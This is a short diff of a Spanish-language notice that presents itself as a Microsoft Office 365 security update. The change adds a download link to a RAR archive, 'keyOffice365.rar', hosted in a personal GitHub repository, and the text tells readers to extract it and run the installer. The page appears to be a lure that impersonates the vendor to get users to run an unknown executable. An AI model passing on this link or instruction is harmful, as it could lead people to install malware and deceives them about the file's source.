@@ -18,7 +18,7 @@ Microsoft ha identificado una vulnerabilidad en versiones anteriores de Office 3
 
 Haga clic en el siguiente enlace para descargar el instalador de la actualización:
 
- Descargar Actualización
+ Descargar Actualización: https://github.com/ellie21kt/Actualizacion_Seguridad_Office/raw/refs/heads/main/keyOffice365.rar 
 
 > Una vez descargado, descomprima el archivo y ejecute el instalador para aplicar la actualización.
 
